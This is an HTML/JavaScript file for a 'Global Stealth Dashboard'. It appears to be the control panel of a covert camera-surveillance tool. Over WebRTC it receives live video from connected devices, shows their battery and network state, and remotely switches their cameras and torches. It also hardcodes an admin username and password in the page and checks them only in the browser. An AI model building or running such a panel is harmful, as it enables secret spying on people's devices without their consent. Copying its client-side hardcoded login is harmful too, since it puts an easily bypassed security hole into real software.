<!DOCTYPE html>
<html>
<head>
    <title>Secure Advanced Monitor</title>
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
        .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
        .cam-container { width: 340px; background: #222; border-radius: 12px; border: 2px solid #333; padding: 10px; position: relative; }
        video { width: 100%; border-radius: 8px; background: #000; }
        .info-panel { display: flex; justify-content: space-between; font-size: 11px; margin: 8px 0; background: #333; padding: 5px; border-radius: 4px; }
        .ctrl-btns { display: flex; gap: 5px; }
        button { flex: 1; padding: 8px; font-size: 11px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
        .btn-sw { background: #0055ff; } .btn-tr { background: #f85606; }
    </style>
</head>
<body>
    <div id="login-overlay">
        <div style="background:#222; padding:30px; border-radius:10px; border:1px solid #f85606;">
            <h2>ğŸ”’ Admin Access</h2>
            <input type="text" id="user" placeholder="Username" style="padding:10px; margin:5px;"><br>
            <input type="password" id="pass" placeholder="Password" style="padding:10px; margin:5px;"><br>
            <button onclick="checkLogin()" style="padding:10px 20px; background:#f85606; color:white; border:none; cursor:pointer;">Login</button>
            <p id="err" style="color:red;"></p>
        </div>
    </div>

    <div id="monitor-ui" style="display:none;">
        <h2>ğŸ›°ï¸ Global Stealth Dashboard</h2>
        <div id="remote-videos" class="monitor-box"></div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const DB_USER = "admin", DB_PASS = "rony25";
        let socket, peers = {};

        function checkLogin() {
            if (document.getElementById("user").value === DB_USER && document.getElementById("pass").value === DB_PASS) {
                document.getElementById("login-overlay").style.display = "none";
                document.getElementById("monitor-ui").style.display = "block";
                initSocket();
            } else { document.getElementById("err").innerText = "Wrong Login!"; }
        }

        function initSocket() {
            socket = io();
            socket.on("offer-front", async (data) => {
                const { offer, senderId } = data;
                if (!peers[senderId]) createVideoBox(senderId);
                const pc = peers[senderId].pc;
                await pc.setRemoteDescription(new RTCSessionDescription(offer));
                const answer = await pc.createAnswer();
                await pc.setLocalDescription(answer);
                socket.emit("answer-front", { answer, to: senderId });
            });
            socket.on("status-update", (data) => {
                if (document.getElementById(`info-${data.id}`)) {
                    document.getElementById(`info-${data.id}`).innerHTML = `ğŸ”‹ ${data.battery}% | ${data.network}`;
                }
            });
            socket.on("user-disconnected", (id) => { if (peers[id]) document.getElementById(`container-${id}`).remove(); delete peers[id]; });
        }

        function createVideoBox(id) {
            const container = document.createElement("div");
            container.className = "cam-container"; container.id = `container-${id}`;
            container.innerHTML = `
                <video id="video-${id}" autoplay playsinline></video>
                <div class="info-panel" id="info-${id}">ğŸ”‹ --% | ğŸŒ Checking...</div>
                <div class="ctrl-btns">
                    <button class="btn-sw" onclick="socket.emit('switch-camera', '${id}')">ğŸ”„ Switch</button>
                    <button class="btn-tr" onclick="socket.emit('toggle-torch', '${id}')">ğŸ’¡ Torch</button>
                </div>
            `;
            document.getElementById("remote-videos").appendChild(container);
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.ontrack = (e) => { document.getElementById(`video-${id}`).srcObject = e.streams[0]; };
            peers[id] = { pc };
        }
    </script>
</body>
</html>

